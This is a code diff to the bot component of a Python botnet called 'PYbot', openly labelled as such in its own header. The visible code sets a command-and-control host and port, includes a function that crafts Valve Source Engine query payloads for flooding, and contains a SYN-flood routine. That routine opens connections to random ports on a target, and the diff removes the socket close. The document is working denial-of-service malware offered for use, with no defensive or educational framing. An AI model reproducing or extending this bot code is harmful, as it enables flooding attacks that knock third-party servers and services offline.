@@ -1,3 +1,8 @@
+# PYbot - A simple Python botnet
+# Author: WodX
+# Date: 27/09/2019
+# Bot
+
 import socket 
 import threading
 import time
@@ -7,9 +12,7 @@ import random
 HOST = '127.0.0.1'
 CNC_PORT = 101
 
-user_agents = [
-
-]
+user_agents = []
 
 # read more at https://developer.valvesoftware.com/wiki/Server_queries
 def craft_vse_payload():
@@ -34,8 +37,7 @@ def attack_syn(ip, secs):
         sock = socket.socket()
         sock.setblocking(0)
         try:
-            sock.connect((ip, random.randint(1, 65535))) # RST/ACK // SYN/ACK as response
-            sock.close()
+            sock.connect((ip, random.randint(1, 65535))) # RST/ACK or SYN/ACK as response
         except:
             pass
 
